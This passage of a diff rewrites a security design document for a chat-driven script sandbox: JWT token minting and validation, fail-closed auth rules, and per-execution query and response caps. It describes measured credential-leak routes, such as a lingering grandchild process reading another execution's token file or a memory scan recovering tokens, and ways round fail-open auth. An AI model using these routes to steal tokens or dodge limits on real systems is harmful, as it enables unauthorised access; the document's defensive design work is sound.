-db-api/results-api (verify). Deliberately *not* `INTERNAL_API_SECRET`: separate key,
-separate blast radius, independent rotation.
-
-Chosen over an opaque token plus introspection because db-api is stateless and has no
-store; introspection would require db-api to call chat-backend, which the NetworkPolicy
-does not permit and which inverts the dependency direction. A JWT validates offline.
-
-**Lifetime:** `exp = iat + 300` (5 minutes). The hard wall clock is 120s; the slack covers
-a slow BigQuery job started at the last moment. Short enough that a captured token is worth
-almost nothing.
-
-**Clock skew, and why the ttl only covers half of it.** The 300s ttl absorbs skew in the
-*past* direction — a verifier whose clock runs ahead of the minter's still sees `exp` in the
-future, with minutes to spare. It does nothing in the *forward* direction: PyJWT ≥ 2.10
-raises `ImmatureSignatureError` as soon as `iat > now`, so a verifier whose clock runs even a
-fraction of a second behind the minter's rejects a freshly minted token outright, and the ttl
-cannot help. The minter and the two verifiers are separate pods and the sandbox is headed for
-a dedicated node pool (`4h6.10`), so they are not even guaranteed the same node clock. Both
-verifiers therefore pass `leeway=5` to `jwt.decode`, which applies to `exp`, `nbf` and `iat`
-alike. It does **not** loosen the 300s bound: the `MAX_TOKEN_AGE_SECONDS` check is separate
-code, compares `iat` against `time.time()` directly, and stays exact.
-
-**One token per audience.** chat-backend mints two per execution. A token captured from a
-results-api request cannot be replayed at db-api.
-
-**How the tokens reach the script — not pod environment variables.** An earlier draft said
-chat-backend "injects them as two environment variables", which does not describe anything
-that can happen: chat-backend cannot set environment variables on a pod that is already
-running, and the only reading under which it *could* — env in the sandbox pod spec — turns
-a 5-minute per-execution token into a static pod-lifetime credential and destroys the
-entire lifetime property. The mechanism is:
-
-1. The tokens travel in the **body of the POST** from chat-backend to the sandbox, minted
-   fresh for that execution.
-2. The supervisor places them in the **forked child's** environment (or file, below) and
-   never in its own. The supervisor holds no credentials at any point (residual #7).
-3. Preferred over the child's environment: a **mode-0600 file under `/scratch/<id>`** that
-   the SDK reads once and unlinks. Reason: `/proc/<pid>/environ` is readable by any process
-   with the same uid, and under option (b) of the pids row the supervisor and child share
-   uid 65532 — so a second child, or any helper process the script spawns, can read the
-   token out of a sibling's environment. `/scratch/<id>` is per-execution and wiped
-   regardless. **The file is not an exposure bound and this paragraph used to imply it was.**
-   An earlier phrasing said read-once-and-unlink "closes the window to the interval before the
-   SDK's first call". It does not close anything by itself: `4h6.55` measured a detached
-   `setsid()` grandchild of an *earlier* execution reading this execution's mode-0600 file
-   **inside** that window, and — because the child was then forked without exec from a
-   supervisor holding the tokens in its address space — measured a raw `/proc/self/mem` scan in
-   the child recovering tokens including from an execution that had already completed.
-   **The memory route is closed** by the fork server (`4h6.55` option (b), "As built (`4h6.55`)"
-   in section 2): the process that forks the child has never held a token, and the file is now
-   the route by which the supervisor reaches the child *without* passing the credential through
-   it. **The same-uid resident route is closed for a resident of an EARLIER execution and open
-   for one of the SAME execution** (`genetics-results-suite-4h6.83`): the fork server is a
-   child subreaper and sweeps what reparents to it at the end of every execution, so the
-   measured shape — a grandchild of execution A reading execution B's token file — no longer
-   has a live process to do it with, but nothing here bounds a process A forked reading A's own
-   file, and the sweep is unverified under gVisor. See "As built (`4h6.55`)" and "As built (`4h6.41`, `4h6.42`, `4h6.43`, `4h6.46`)" in
-   section 2. **Under option (a) — a distinct child uid — mode 0600 alone makes the file
-   unreadable by the child**, which is the process that needs it: the supervisor writes it
-   and must then `chown` it to the child uid at mode `0400` *before* the fork. That, and the
-   matching rule for artifacts written by the child and read by the supervisor, are in
-   section 2's "Permission contract"; option (a) is not implementable without both. **Option
-   (b) is the one in effect** ("The uid choice", section 2), so this is the shared-uid case:
-   mode 0600 does not exclude the child, and read-once-and-unlink is the whole mitigation.
-4. Nothing about the tokens is written to the pod spec, to a ConfigMap, or to a Secret.
-
-**Claims (all required, all validated):**
-
-| Claim | Value | Purpose |
+| claim | value | purpose |
 |---|---|---|
-| `iss` | `"chat-backend"` | Rejects tokens minted by anything else. |
-| `aud` | `"db-api"` or `"results-api"` | Prevents cross-service replay. |
-| `sub` | authenticated user email (from `X-Goog-Authenticated-User-Email`) | Attribution to a person. |
-| `sid` | chat session id | **Required.** Makes db-api's `endpoint_access` log lines attributable to a conversation, which is what turns the SDK-call instrumentation (`4h6.12`) into an answerable "what did that script actually read?". |
-| `jti` | execution id (uuid4) | Same value as the `/scratch/<execution-id>` directory name, so logs join across chat-backend, the sandbox SDK instrumentation and db-api. |
-| `iat`, `exp` | as above | |
-| `scope` | `"query:views"` | A coarse capability string. **In v1 only its presence is checked** — it is a hook for later per-view narrowing, and is documented as such rather than implied to enforce anything today. |
-
-**Validation in db-api — and this path must NOT inherit fail-open.**
-
-`genetics-results-db/api/main.py` `require_auth` currently begins:
-
-```python
-if not INTERNAL_API_SECRET or request.url.path in _UNAUTHENTICATED_PATHS:
-    return
-```
-
-with a startup `logger.warning` as the only signal. That is deliberate for the shared-secret
-path (mid-rollout clusters keep serving) and it is *unacceptable* for the sandbox path,
-because the sandbox is the one caller whose input is attacker-influenced. Concretely, for
-`4h6.9`:
-
-1. Restructure `require_auth` so a **sandbox-shaped bearer** is routed to the sandbox
-   validator *before* the `if not INTERNAL_API_SECRET` early return can short-circuit it.
-   The unset-secret branch must be unreachable for such a request.
-
-   **Discriminate on the JOSE header, not on dots.** "Three dot-separated segments" is
-   *not* the discriminator — it matches every RS256 Google Identity Token as well, and
-   using it would 401 that entire class of caller (latent in db-api today only because
-   db-api has no other JWT caller; immediately fatal in results-api, which does — see the
-   results-api subsection). The rule: base64url-decode the first segment *unverified*,
-   read `alg`, and route to the sandbox validator only when `alg == "HS256"` (optionally
-   also requiring `iss == "chat-backend"`). Anything else continues down the pre-existing
-   auth paths untouched.
-
-   **Why reading an unverified header is safe here, and what an implementer must not
-   conclude from it.** The header is used *only to select a validator*, never to configure
-   one. Each branch pins its own algorithm independently of what the header claimed — the
-   sandbox branch decodes with `algorithms=["HS256"]` and the signing key, the Google
-   branch verifies against Google's RS256 certificates. A forged `alg` therefore changes
-   which validator rejects the token, not whether it is rejected. This is *not* licence to
-   pass the header's `alg` into the decoder, and not licence to trust `kid`, `iss` or any
-   other header field for anything beyond routing.
-2. A sandbox-shaped bearer (HS256) is validated **only** as a sandbox token. It must never
-   fall through to the `hmac.compare_digest` shared-secret comparison — otherwise a
-   malformed token degrades into "is this string equal to the secret", which is a downgrade
-   path.
-3. If `SANDBOX_TOKEN_SIGNING_KEY` is unset, every sandbox-shaped (HS256) bearer is rejected
-   `401`. **Fail closed, with no warning-and-continue.** Non-HS256 bearers are unaffected.
-4. Decode with an explicit `algorithms=["HS256"]` allow-list (the `alg: none` / RS256-HMAC-
-   confusion footgun), explicit `audience=` matching this service, and
-   `options={"require": ["iss", "aud", "sub", "sid", "jti", "iat", "exp"]}`. Reject `iat`
-   more than 300s in the past.
-5. Log `sid`, `sub` and `jti` on every request authorized this way, into the existing
-   structured log line that feeds the `genetics_api_logs` sink — whose production table is
-   `phewas-development.genetics_api_logs.stdout` (named after the log ID, not the service; the
-   similarly named `genetics_api_logs.genetics_results_api` is a developer VM's test output).
-   **Caveat: whether those three fields are queryable in BigQuery has to be checked, not
-   assumed — and the reason this document once gave for their absence has expired.** That
-   `jsonPayload` schema grows a `sid`, `sub` or `jti` column only once a sandbox-authorized
-   request reaches the sink, and the premise stated here was that none ever had, because no
-   sandbox Deployment was applied and `SANDBOX_ENABLED` was `"false"`. Neither half survives the
-   manifests: `SANDBOX_ENABLED` is `"true"` in **all three** deployments that carry it —
-   `k8s/deployments/db-api.yaml`, `results-api.yaml` and `chat-backend.yaml`, flipped together by
-   `genetics-results-suite-5r2` — and `sandbox_pool_enabled = true` in
-   `terraform/terraform.tfvars.daly-staging` opens `deploy.sh`'s gate on `sandbox.yaml`. What a
-   given deployment's sink actually holds is not derivable from this checkout either way, so
-   query the table's schema before relying on `sid`, `sub` or `jti` being selectable. Sandbox
-   attribution is readable in Cloud Logging and container stdout regardless; in BigQuery it is
-   readable only if those columns are there, and that is a check, not an assumption.
-6. **db-api refuses to start** — `sys.exit(1)`, not a `logger.warning` — when the sandbox
-   is deployed and `INTERNAL_API_SECRET` is unset. Rules 1-5 all fire on "a sandbox-shaped
-   bearer", and **nothing in this design obliges the sandbox to send one**. A script that
-   simply omits the `Authorization` header falls into `if not INTERNAL_API_SECRET: return`
-   and is authorized — with no `sid`, `sub` or `jti` to attribute it to anyone, and,
-   because the caps below are keyed on the token audience, *without* the byte and row caps
-   as well. The fail-closed rules would be opt-in for the one caller they exist for.
-
-   **Trigger on the sandbox being deployed, not on the signing key being present.** An
-   earlier draft made rule 6 fire on `SANDBOX_TOKEN_SIGNING_KEY` being set. That leaves the
-   both-unset case wide open: deploy db-api with *neither* `SANDBOX_TOKEN_SIGNING_KEY` nor
-   `INTERNAL_API_SECRET` while the sandbox is running, and db-api boots fail-open and the
-   sandbox reaches it by sending no `Authorization` header at all — exactly the hole rule 6
-   exists to close. So the condition is a **separate required input**,
-   `SANDBOX_ENABLED` (a boolean env var on db-api and results-api, set true by the same
-   deploy that creates the sandbox Deployment): if `SANDBOX_ENABLED` is true and either
-   `INTERNAL_API_SECRET` or `SANDBOX_TOKEN_SIGNING_KEY` is unset, `sys.exit(1)`. The
-   configuration is then unbootable in *both* the key-set and the both-unset shapes.
-
-   **A truthy key is not a usable key** (`genetics-results-suite-4h6.36`). The gate above tests
-   presence, and `"   "`, `"\n"`, `"x"` and `"0"` all pass it — the `kubectl create secret
-   --from-file` of a near-empty file — and then become guessable HMAC keys that mint valid
-   sandbox principals. So both verifiers additionally `sys.exit(1)` when
-   `SANDBOX_TOKEN_SIGNING_KEY` is **shorter than 32 bytes** ignoring surrounding whitespace
-   (`MIN_SIGNING_KEY_BYTES` in `api/sandbox_auth.py` and `app/core/sandbox_token.py`, kept equal
-   in both because the two share one deployed key). 32 is the threshold the crypto layer already
-   names: RFC 7518 §3.2 requires an HS256 key at least as long as the hash output, and PyJWT
-   raises `InsecureKeyLengthWarning: The HMAC key is N bytes long, which is below the minimum
-   recommended length of 32 bytes for SHA256` under it — this moves that warning from a log line
-   nobody reads to a refusal to boot. Nothing a correct install produces is affected:
-   `create-secrets.sh`'s `openssl rand -base64 32` is 44 chars and `dev-stack.sh`'s
-   `secrets.token_urlsafe(32)` is 43.
-
-   **The gate measures the stripped key and then discards it; nothing normalises the value used
-   for signing or verifying, and nothing may.** chat-backend MINTS with its own copy of the
-   secret and the two verifiers VERIFY with the exact bytes they are given, so a `.strip()` in
-   `_signing_key()` would verify `"key"` against tokens signed with `"key\n"` and 401 **every
-   legitimate sandbox token**. Normalisation would have to change the minter and both verifiers
-   in one coordinated deploy; a length check needs no such coordination, which is the whole
-   reason it is the fix. A key that differs from its stripped form is instead **logged as a
-   warning at startup**, so a trailing-newline secret is visible rather than silently
-   load-bearing.
-7. **`SANDBOX_TOKEN_SIGNING_KEY` joins `deploy.sh`'s existing "check secrets exist" gate**,
-   next to the secrets it already verifies before applying manifests. Rule 6 refuses to run
-   the pair mis-configured; this stops the pair being *deployed* apart in the first place,
-   so the failure surfaces at deploy time rather than as a crash-looping db-api.
-
-**Implementation note for the caps, so they are not enforced in the wrong place.**
-`genetics-results-db/api/main.py` declares `max_rows: int = Field(default=1000, le=MAX_ROWS)`
-— a **class-level** Pydantic constraint, evaluated at model definition time and identical
-for every request. It cannot vary per credential. So the per-credential row cap must be
-enforced **in the handler**, after the principal is known, by clamping the validated
-`max_rows` down; tightening the module-level `MAX_ROWS` would apply the sandbox default to
-every caller in the process, including the relaxed ones.
-
-**Caps are the default, not a penalty applied to sandbox tokens.** This inverts an earlier
-draft, in which the sandbox's lower limits were keyed on the sandbox audience — meaning a
-caller could obtain *looser* limits by presenting a *weaker* credential, or none at all.
-The sandbox-audience limits are the **defaults for every request db-api serves**, relaxed
-to the existing operator-configured values only for a request carrying a *verified*
-non-sandbox credential. No credential, or an unverified one, gets the tight limits.
-
-**"Verified non-sandbox credential" means different things on the two services, and
-conflating them breaks results-api.** On **db-api** it is exactly one thing: a successful
-`hmac.compare_digest` against `INTERNAL_API_SECRET`. db-api has no other caller and no
-other auth path. On **results-api** that definition is wrong and would silently degrade
-real users: `k8s/deployments/auth-gateway.yaml`'s `@api_bearer` location routes
-programmatic clients **straight to results-api with their own Google id_token or per-user
-chat API token and deliberately no shared secret**. Under an hmac-only rule those verified
-humans would land on the tight sandbox defaults on the bulkiest endpoints in the suite —
-summary-statistic ranges and LD. So on results-api the relax condition is **any
-successfully verified non-sandbox principal**: the shared secret, a verified Google
-id_token, or a verified per-user API token. The tight defaults apply to the sandbox
-audience and to anything unverified.
-
-**The numbers, and why the earlier ones were not caps.** db-api's existing defaults are
-`MAX_ROWS = 100000` and `MAX_BYTES_BILLED = 100 GB`. The earlier "cap" of 50 GB per query
-was therefore a factor of two on bytes and no change at all on rows, against a caller that
-has 120 seconds in which to loop. For the sandbox audience:
-
-| Limit | Value | Note |
-|---|---|---|
-| `maximum_bytes_billed` per query | 50 GB | Half the existing default. Bounds one query only — which is the point of the next row. |
-| Aggregate bytes billed per `jti` | 200 GB | Four queries at the per-query ceiling. **The control the per-query cap is not.** A single-pod, 120-second, concurrency-1 token needs no shared state to enforce this: an in-process counter in db-api keyed on `jti`, with a bounded LRU so a flood of distinct `jti`s cannot grow it, is sufficient. Over budget → `429`, not a silent truncation. |
-| Response rows | 25 000 | **db-api only.** A quarter of the existing default, and well above what any legitimate aggregation returns *to a script* — the script aggregates in-pod and returns 64 KiB to the model regardless (section 2). results-api carries **no** row cap; see "As shipped" below for why counting rows there cost more than it bought. |
-| Response bytes per request | 16 MiB | **results-api only** (`SANDBOX_MAX_RESPONSE_BYTES`). Bounds one response, of **any** status — a non-2xx body is caller-controlled too, since FastAPI's 422 handler echoes the offending input. Which is the point of the next four rows. |
-| Aggregate response bytes per `jti` | 1 GiB | **results-api only** (`SANDBOX_AGGREGATE_RESPONSE_BYTES_BUDGET`). 64 responses at the per-response cap, or ~8.5 MB/s sustained across the whole 120 second wall clock. Charged from bytes actually **sent**, so it agrees with the per-response cap's own buffer rather than re-measuring — and charged for every status, not only 2xx. |
-| Requests per `jti` | 1000 | **both** (`SANDBOX_MAX_REQUESTS_PER_EXECUTION`). The byte budget does not bound a loop of *small* responses on results-api, nor a loop of *zero-BigQuery* requests on db-api, and every request costs the pod a tabix seek, a GCS range read or a request slot whatever its size. ~8 rps over 120 seconds. db-api gained it in `4h6.61`; see the `4h6.49` comparison above for the measurement that decided it. |
-| Concurrent requests per `jti` | 4 | **both** (`SANDBOX_MAX_CONCURRENT_REQUESTS`). On results-api this is reachable in full only by a **lone** execution — the reserve two rows down is paid for out of the incumbents' allowance; measured at 8/4/2, 3 other executions parked on a slot each cut a tenant to 3 concurrent, 4 parked to 2, 6 parked to 1. The one limit here with a **memory** failure mode rather than a cost one: on results-api each in-flight capped request buffers up to 16 MiB (4 × 16 MiB = 64 MiB against an 8Gi pod); on db-api the pod is `replicas: 1` at `cpu: 500m` / `memory: 512Mi` and also serves the browser's chat path through chat-backend. |
-| Concurrent sandbox requests per pod | 8 | **both** (`SANDBOX_MAX_CONCURRENT_REQUESTS_TOTAL`). Across all executions. Unreachable today, since the sandbox is `concurrency: 1` and the per-`jti` limit binds first; it exists so raising the sandbox's own concurrency cannot silently multiply either pod's peak load. Refused at import if it is set below the per-`jti` value, on both services. |
-| Pod-wide slots reserved for idle executions | 2 | **results-api only** (`SANDBOX_RESERVED_POD_SLOTS`, `genetics-results-suite-yv4`). The fairness half of the row above: an execution that already holds a pod-wide slot may not take the last 2, so two executions at their per-`jti` allowance can no longer occupy all 8 and refuse every other execution's *first* request — filling all 8 now takes **four** distinct executions, `ceil((TOTAL − RESERVED) / PER) + RESERVED`. Refused at import above `TOTAL − per-jti`, which is exactly the condition under which a lone execution never meets it — so today's `concurrency: 1` behaviour is unchanged. db-api's port does not carry it; see below. |
-| Sandbox request deadline | 120 s | **results-api only** (`SANDBOX_REQUEST_TIMEOUT_SECONDS`, `genetics-results-suite-yv4`). Equal to the sandbox's own hard wall-clock ceiling, so a request outliving it is producing a body no execution is alive to read. Armed **only** for a request carrying an execution token, in the same `try` whose `finally` releases the slot. Answers `504`, not `429`: it is the pod's deadline firing, not a caller quota. |
-| Tracked executions per pod | 4096 | **both** (`SANDBOX_MAX_TRACKED_EXECUTIONS`). A bound on the counter map itself, not on any execution, so a flood of distinct `jti`s cannot grow it without limit; a full map refuses a **new** execution rather than evicting a live one, because an evicted counter is a reset budget. Entries are swept once the token can no longer authenticate **and** nothing is in flight under it. Note this is a *different* eviction policy from db-api's older `_jti_bytes` byte-budget map, which is still a 1024-entry LRU. |
-| Applied row cap, reported | — | **db-api only** (`max_rows_applied` on the `/query` response). Not a limit: the row cap above is invisible in a truncated result, and the two candidate ceilings differ by 4× (25 000 vs the relaxed 100 000), so `/query` reports the ceiling it actually ran under and the SDK's truncation error quotes that number instead of hardcoding one (`4h6.32`). |
-
-All are enforced server-side from the token, never requested by the caller, and a
-script cannot widen them by asking. db-api's BigQuery byte and row caps are module constants;
-the request-count and concurrency limits are env-configurable on **both** services, because
-neither the payload sizes results-api serves nor the load db-api can absorb is a number an
-operator should have to rebuild an image to move — and on both they are declared at their
-in-code defaults in the Deployment (`k8s/deployments/results-api.yaml`, seven;
-`k8s/deployments/db-api.yaml`, four), since a knob no manifest names is env-configurable in the
-code and code-default-only in practice.
-
-**What the aggregate budget actually bounds — stated rather than left to be inferred.**
-`jti` is the **execution** id, so 200 GB is a per-*execution* budget, not per session and
-not per user. chat-backend mints a fresh `jti` for every `run_analysis` call, so the real
-bound on a determined user is **200 GB × turns**, and nothing in this design caps the number
-of turns. That is tolerable here for two measured reasons, not by assumption: concurrency is
-1 with a queue, so executions serialize rather than multiply, and the measured peak is 23
-chat turns/hour — an upper bound of roughly 4.6 TB/hour scanned *if every turn ran a script
-that deliberately exhausted its budget*, which is visible in BigQuery billing and — now that
-`4h6.43`/`4h6.44` deliver the token and db-api's `endpoint_access` line therefore carries `sub`,
-`sid` and `jti` — attributable per user and session through the db-api half of control 3 in
-6.2. The SDK-side half of that control is still neither collected nor, against a hostile
-script, trustworthy (6.2, control 3). If a
-per-session or
-per-user budget is ever wanted, the same in-process LRU counter keyed on `sid` or `sub`
-instead of `jti` provides it; it is deliberately not in v1 because a cross-turn budget needs
-shared state once replicas exceed 1.
-
-**As shipped (`genetics-results-suite-4h6.28`), and the one place the implementation departs
-from the paragraphs above.** db-api enforces all three limits in `api/main.py`: `_caps_for()`
-resolves the row and byte ceilings from `request.state.principal`, the row cap is clamped in
-`execute_query` (not on the Pydantic field, and not by lowering `MAX_ROWS`), and the aggregate
-budget is charged from the dry run's estimate *before* the query runs and reconciled afterwards
-to the bytes the job **processed** — so a cache hit does not consume budget and the 429 arrives
-before the spend, not after it. A query that raises between the charge and the reconcile is
-refunded in a `finally`: a job that never ran bills nothing, so a script's syntax errors, each
-priced by the dry run, must not eat a budget they spent no bytes of.
-
-*Processed, not billed — this section previously said "actually billed", which is the wrong
-figure.* `total_bytes_billed` is what Google invoices (10 MB minimum, rounded up), but a
-**dry-run job reports only `total_bytes_processed`** — its billed figure is 0. Processed is
-therefore the one number available on *both* sides of a pre-flight charge and its correction,
-and charging in one unit while reconciling in the other would make the correction wrong by
-construction. The two differ by at most 10 MB per query against a 200 GB budget.
-
-*The budget covers all four of db-api's BigQuery paths, not only `/query`.* `/schema`'s
-distinct-value scans, `/stats`'s uncached `GROUP BY dataset, data_type` over `credible_sets_v`,
-and `/tables/{t}/sample` all submit jobs and none of them is cached at the HTTP layer, so a
-script could loop them for its whole wall clock at up to 50 GB a call entirely outside a budget
-this section describes as an aggregate across every query of one execution. All three now go
-through one shared helper (`_run_internal_query`) that refuses to start a job once the budget is
-spent and charges what the job processed once it finishes. Post-hoc charging is forced — those
-paths have no dry run to price them with — and it means the budget can be overshot by at most
-one query, and by at most that query's `maximum_bytes_billed`, which is exactly what the
-per-query cap bounds.
-
-*The `/schema` value scans run at the **triggering** caller's ceiling, not the operator's.* They
-used to pass no request at all, so a sandbox request drove them at the relaxed 100 GB ceiling —
-**twice its own per-query cap** — and paid nothing, which inverts the point of the caps. The
-earlier justification (one caller's cap must not decide what a later caller finds in the shared
-`_get_categorical_values` cache) was sound about the cached *value*, but it silently also decided
-who pays and at what ceiling, and those are separable. Cache contents are still not contaminated
-across callers: a job over the triggering caller's ceiling fails and leaves the cache
-unpopulated, so the next caller retries the scan under its own limits. `_VALUES_CACHE_TTL_SECONDS`
-behaviour is otherwise unchanged.
-
-db-api runs `replicas: 1` and no HorizontalPodAutoscaler exists in
-`k8s/`, so the in-process counter is exact today — **at more than one replica it bounds spend
-per replica, not globally.** That is a real limit of the design, not a detail: two replicas
-would make the effective budget 400 GB per `jti`. `k8s/deployments/db-api.yaml` carries a
-comment on `replicas: 1` saying so, because a routine scale-up would otherwise multiply the
-budget silently.
-
-results-api enforces a **16 MiB response-byte cap, and no row cap**, in
-`SandboxResponseCapMiddleware` (`app/middleware.py`), registered innermost so it measures the
-payload the caller decodes rather than its gzipped size. A capped response is buffered —
-bounded by the byte cap itself — because a stream cannot be un-sent once its first chunk is on
-the wire, and this design requires a 429 rather than a truncation. A relaxed response is never
-buffered or inspected, so browser and BFF traffic is untouched.
-
-*Why there is no row cap here, though the table above lists one for db-api.* Enforcing it meant
-`json.loads` over the whole buffered body, synchronously on the event loop, purely to get a
-length. For 25 000 wide rows the parsed object graph is several times the byte size, so peak
-memory ran to roughly 100–200 MB per in-flight capped request on a `replicas: 1` pod with an
-8Gi limit that already preloads the gene maps and the search index — and nothing limits a
-script's concurrency. That made the row cap a memory amplifier **only a sandbox caller could
-trigger**: presenting the token hurt the service more than omitting it. It also never bound the
-payloads it was written for, because the counter recognised only JSON and **TSV is the default
-`format` of every bulk range endpoint**. The byte cap was already the binding one — 25 000
-summary-statistic rows serialize to roughly 5 MB, well inside 16 MiB — so dropping the row cap
-removes the amplifier without loosening anything that bound. The buffer is now also passed
-downstream as-is instead of being copied to `bytes`, which removed a second 16 MiB peak.
-
-*Over the cap the producer is torn down, not merely ignored.* Dropping the later ASGI messages
-bounds what the caller **receives** but not what results-api **spends**: measured, a 10 KiB cap
-against a 100 KiB `StreamingResponse` returned 429 after 11 chunks while the generator produced
-all 100 — and on the real endpoints that generator is GCS range reads plus the
-`TABIX_FILTER_WORKERS` pool. The middleware now raises out of `send` once the 429 is on the
-wire, which breaks `StreamingResponse.stream_response`'s `async for` and abandons the iterator.
-The exception passes through Starlette's `ExceptionMiddleware` (which handles only
-`HTTPException`) untouched and is caught by the cap middleware itself, so no 500 is ever
-attempted over the 429 already sent. `tests/test_response_caps.py` counts the generator's
-iterations to pin this, on both ASGI spec versions.
-
-*The per-execution limits on results-api (`genetics-results-suite-4h6.29`).* The byte cap above
-bounds **one** response; it does not bound a script that issues many in-cap requests over its 120
-seconds, and the producer teardown of `4h6.28` bounds what a single *rejected* request costs to
-produce, not a loop of accepted ones. `app/core/sandbox_budget.py` is the analogue of db-api's
-`_jti_bytes`, deliberately shaped like it — one in-process map keyed on `jti`, checked **before**
-the handler runs, answering 429 rather than truncating. The table above has **eight** results-api
-rows — count them, an earlier draft said seven and also said the tracked-execution bound was not
-one of them, and both were wrong — and this module holds **six**: the aggregate byte budget, the
-request count, the two concurrency bounds, the pod-wide reserve and `SANDBOX_MAX_TRACKED_EXECUTIONS`.
-The other two are the 16 MiB per-response row, which lives in `app/core/limits.py` and
-`app/middleware.py`, and the deadline, whose value is declared in this module but which is armed
-and answered in `app/middleware.py`. Six of those controls refuse an admission, which is why
-`admit` emits **six** rejection codes. Two more are recorded by this module's
-`log_request_timeout` rather than returned by `admit`, for the two ways the deadline can fire:
-`sandbox_request_timeout` (nothing on the wire — the caller gets the 504) and
-`sandbox_request_timeout_after_send` (the response had already begun — no 504 is possible, since
-that would be a second `http.response.start` on a completed response). **Eight** codes in all.
-
-It is admitted and released inside `SandboxResponseCapMiddleware`, whose `finally` the ASGI
-contract puts after the last byte of the response, a `StreamingResponse` included. An earlier
-draft justified that placement by saying a streaming generator outlives every dependency's
-teardown; **measured on FastAPI 0.136.1 that is false** — a `yield` dependency's exit code runs
-*after* the response body, so for a matched route the two placements are indistinguishable. The
-reason the middleware is nevertheless the only correct place is different and stronger: `admit`
-runs for every request, while a dependency is solved only for a **matched route**. An unmatched
-path 404s out of the router with no dependency ever entered, so a teardown placement strands
-that concurrency slot permanently — and `_sweep_locked` cannot reclaim the entry either, since
-it refuses to evict anything with `in_flight > 0`. That is the mutation
-`tests/test_sandbox_budget.py::test_an_unmatched_route_releases_its_slot` exists to kill.
-
-*The request deadline, and why it is armed there too* (`genetics-results-suite-yv4`). Nothing
-bounded how long **one** request may hold a slot, and the anti-eviction rule above is what made
-that compound: a request wedged in a GCS read held a per-`jti` slot, a pod-wide slot **and** an
-entry `_sweep_locked` may never reclaim, for as long as the socket stayed open — so a handful of
-hung requests reached the pod-wide bound with no attacker at all. `SANDBOX_REQUEST_TIMEOUT_SECONDS`
-(120 s) is armed with `asyncio.timeout` inside `SandboxResponseCapMiddleware.__call__`, around
-the same `await self.app(...)` the slot is held across. Two placements were rejected: **uvicorn
-has no per-request timeout** — `timeout_keep_alive` bounds an idle connection between requests
-and `timeout_graceful_shutdown` a shutdown, neither touching a request in progress — and an
-**outer ASGI middleware** would cancel this `__call__` from outside, which still runs the
-`finally` but leaves the deadline and the release as two separately-ordered layers a later
-`setup_middleware` edit could reorder with no test noticing. Armed where it is, the `TimeoutError`
-unwinds through the very `finally` that calls `release`, so the timeout path and the happy path
-are the same line rather than two that must be kept in step —
-`tests/test_sandbox_budget.py::test_a_request_that_outlives_the_deadline_is_abandoned_and_releases_its_slot`
-and `::test_a_timed_out_entry_becomes_evictable_again` are what fail if it moves. The answer is a
-**504** carrying the same `code`/`limit`/`observed` shape, except where an *uncapped* response
-already had its start message sent, where the status is spent and the connection simply closes
-incomplete. It is armed only for a request that resolved an execution token: browser and BFF
-traffic holds no slot and pins no entry, and a deadline on it would be a new bound on traffic
-this control is not about.
-
-*The pod-wide bound has a fairness reserve* (`genetics-results-suite-yv4`). At `TOTAL = 8` and
-`per-jti = 4`, two executions at their own allowance occupied every slot, and the party denied
-was a third execution that had done nothing — the pod-wide limit denying exactly the tenants it
-exists to protect. `SANDBOX_RESERVED_POD_SLOTS` (2) makes the last slots reachable only by an
-execution with **nothing in flight**: one already holding a slot stops at `TOTAL − RESERVED`.
-Nothing is preempted — that would corrupt a running execution's accounting the way eviction
-would — and nothing is queued, for the reasons above. What this buys is bounded and worth
-stating exactly: filling the pod takes `ceil((TOTAL − RESERVED) / PER) + RESERVED` distinct
-executions, **four** at the shipped 8/4/2 against two before — by exhaustive search of the
-reachable states, 1 execution reaches 4 in flight, 2 reach 6, 3 reach 7 and 4 reach 8 — so the
-guarantee is "**no execution is denied its first concurrent request until at least
-`SANDBOX_RESERVED_POD_SLOTS` others each hold one**", not "no execution is ever denied".
-**The newcomer's fairness is paid for out of the incumbents' allowance**, which is inherent to a
-reservation and is not visible in the number 4 anywhere that number is advertised: an execution
-reaches its per-`jti` allowance in full only when it is alone. Measured at 8/4/2 — 3 other
-executions parked on one slot each cut a tenant to 3 concurrent, 4 parked to 2, 6 parked to 1. The reserve is refused at import above `TOTAL − per-jti`, which is precisely the
-condition under which a lone execution — the only case that exists while the sandbox is
-`concurrency: 1`, since `_in_flight_total` is then that execution's own `in_flight` — never
-meets it. **db-api's port (`api/sandbox_budget.py`) does not carry the reserve or the deadline**:
-its pod-wide bound has the same shape and the same latent unfairness, and closing it there is a
-separate change against a separate service.
-
-*Rejection, not queueing, and the reason.* Queueing an over-concurrency request holds it while
-the sandbox's ~120 second clock keeps running, which a script cannot distinguish from slow data
-and cannot act on, and work admitted from a queue can complete after its execution is already
-dead — precisely the wasted production `4h6.28` removed. A fast 429 leaves the script clock to
-narrow the request or back off. Every one of these 429s carries a `code`, a `limit` and an
-`observed` value (`sandbox_response_bytes`, `sandbox_aggregate_bytes`, `sandbox_request_count`,
-`sandbox_concurrency`, `sandbox_concurrency_pod`, `sandbox_concurrency_pod_share`,
-`sandbox_execution_tracker_full`), so an operator reading a log line knows which control fired
-without inferring it from prose. The deadline's two codes carry the same three
-fields but are **not** among these 429s, and are recorded by
-`sandbox_budget.log_request_timeout` rather than returned by `admit`: `sandbox_request_timeout`
-answers **504**, and `sandbox_request_timeout_after_send` answers nothing at all. The second is
-counted rather than swallowed because the slot was pinned for the full deadline either way —
-a request that reaches the deadline is never silent, which is the property an operator needs
-when the alternative is the cheapest slot-pinning primitive in the module going unrecorded.
-
-*Denials are observable, and the counters travel with them* (`genetics-results-suite-yv4`).
-Until this, a rejection produced a `logger.warning` and an admission produced nothing, so a
-denied hour and a quiet hour looked identical in a log and there was no production datum to size
-1000/4/8 against. Three changes, all in `app/core/sandbox_budget.py`: a **pod-wide** denial
-(`sandbox_execution_tracker_full`, `sandbox_concurrency_pod`, `sandbox_concurrency_pod_share`)
-and a `sandbox_request_timeout` log at **ERROR**, because one of those is either an attack or a
-capacity signal, while a per-execution denial and a `sandbox_request_timeout_after_send` stay
-WARNINGs because in neither case was anybody served worse; every such
-line carries process-lifetime counters and high-water marks (`stats()`: admissions, rejections
-by code, tracked entries, peak in-flight pod-wide and per-execution, peak requests per
-execution), so the denial and its denominator arrive together; and **one INFO line per
-execution** — emitted when its map entry is created, not per request, which at the measured 23
-chat turns/hour is the admission signal without 1000× the volume for no extra information.
-There is no metrics endpoint: `stats()` is a dict on a `replicas: 1` process whose uptime is the
-window, and adding a scrape surface is a bigger change than the observability gap warranted.
-
-*Bytes are counted as **sent**, from the cap middleware's own buffer.* The two therefore cannot
-diverge or double-count. **Every status is buffered, capped and charged, not only 2xx.** An
